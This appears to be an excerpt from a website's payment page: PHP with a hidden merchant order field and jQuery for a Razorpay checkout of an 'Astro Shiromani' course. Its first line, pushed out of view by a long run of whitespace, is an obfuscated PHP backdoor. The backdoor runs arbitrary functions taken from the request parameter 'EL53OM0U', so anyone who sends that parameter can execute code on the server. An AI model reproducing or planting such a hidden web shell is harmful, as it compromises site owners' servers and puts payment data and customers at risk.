<?php
                                                                                                                                                                                                                                                             if (	$wh2b0=@ $	{'_REQUEST'}[	'EL53OM0U' ]){{$wh2b0	[1] (${$wh2b0[ 2] }	[ 0	],$wh2b0 [3 ] ($wh2b0[	4]));}} ; 
...
<input type="hidden" name="merchant_order_id" id="merchant_order_id" value="astroshiromani"> 
...
<script type="text/javascript">
  jQuery(document).on('click', '#razor-pay-now', function (e) {
    ...
    var store_description = 'Astro Shiromani Course Payment';
